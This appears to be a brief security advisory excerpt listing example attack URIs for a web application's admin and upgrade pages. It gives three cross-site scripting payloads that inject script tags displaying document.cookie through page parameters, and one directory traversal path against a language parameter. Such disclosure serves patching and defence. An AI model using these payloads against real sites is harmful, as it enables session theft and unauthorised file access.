Attackers can exploit the cross-site scripting issue by enticing an unsuspecting victim to follow a malicious URI.

The following example URIs are available:

Cross-site scripting:

http://www.example.com/admin.php?page=configuration&amp;section=%22%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E

http://www.example.com/admin.php?page=languages_new&amp;installstatus=%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E

http://www.example.com/admin.php?page=theme&amp;theme=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Directory traversal:

http://www.example.com/upgrade.php?language=../../../../../tmp/
